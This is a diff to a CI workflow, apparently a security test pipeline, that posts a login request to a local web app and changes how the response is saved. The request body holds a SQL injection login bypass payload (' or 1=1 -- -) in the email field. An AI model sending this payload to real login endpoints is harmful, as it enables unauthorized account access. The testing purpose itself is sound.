@@ -25,10 +25,10 @@ jobs:
         run: |
             sleep 10 
             mkdir -p artifacts
-            curl --path-as-is -i -s -k -X $'POST' \
+            curl -o artifacts/curlRes.json --path-as-is -i -s -k -X $'POST' \
               -H $'Host: localhost:3000' -H $'Content-Length: 43' -H $'Content-Type: application/json' -H $'Connection: keep-alive' \
               --data-binary $'{\"email\":\"\' or 1=1 -- -\",\"password\":\"pass\"}' \
-              $'http://localhost:3000/rest/user/login' > artifacts/curlRes.json
+              $'http://localhost:3000/rest/user/login' 
 
       - name: Install fuzzing
         run: |
